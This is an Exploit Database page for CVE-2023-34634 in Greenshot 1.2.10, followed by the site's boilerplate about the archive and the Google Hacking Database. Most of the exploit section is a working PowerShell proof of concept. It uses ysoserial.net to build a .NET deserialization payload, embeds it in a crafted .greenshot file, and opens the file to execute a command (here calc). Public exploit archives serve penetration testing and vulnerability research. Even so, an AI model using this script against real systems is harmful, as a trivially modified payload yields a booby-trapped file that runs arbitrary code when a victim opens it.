﻿# Exploit Title: GreenShot  1.2.10 - Insecure Deserialization Arbitrary Code Execution
# Date: 26/07/2023
# Exploit Author: p4r4bellum
# Vendor Homepage: https://getgreenshot.org
# Software Link: https://getgreenshot.org/downloads/
# Version: 1.2.6.10
# Tested on: windows 10.0.19045 N/A build 19045
# CVE : CVE-2023-34634
#
# GreenShot 1.2.10 and below is vulnerable to an insecure object deserialization in its custom *.greenshot format
# A stream of .Net object is serialized and inscureley deserialized when a *.greenshot file is open with the software
# On a default install the *.greenshot file extension is associated with the programm, so double-click on a*.greenshot file
# will lead to arbitrary code execution
#
# Generate the payload. You need yserial.net to be installed on your machine. Grab it at https://github.com/pwntester/ysoserial.net
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity  -c "calc" --outputpath payload.bin -o raw
#load the payload
$payload = Get-Content .\payload.bin -Encoding Byte
# retrieve the length of the payload
$length = $payload.Length
# load the required assembly to craft a PNG file
Add-Type -AssemblyName System.Drawing
# the following lines creates a png file with some text. Code borrowed from https://stackoverflow.com/questions/2067920/can-i-draw-create-an-image-with-a-given-text-with-powershell
$filename = "$home\poc.greenshot"
$bmp = new-object System.Drawing.Bitmap 250,61
$font = new-object System.Drawing.Font Consolas,24
$brushBg = [System.Drawing.Brushes]::Green
$brushFg = [System.Drawing.Brushes]::Black
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
$graphics.DrawString('POC Greenshot',$font,$brushFg,10,10)
$graphics.Dispose()
$bmp.Save($filename)

# append the payload to the PNG file
$payload | Add-Content -Path $filename -Encoding Byte -NoNewline
# append the length of the payload
[System.BitConverter]::GetBytes([long]$length) | Add-Content -Path $filename -Encoding  Byte -NoNewline
# append the signature
"Greenshot01.02" | Add-Content -path $filename -NoNewline -Encoding Ascii
# launch greenshot. Calc.exe should be executed
Invoke-Item  $filename
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by ...
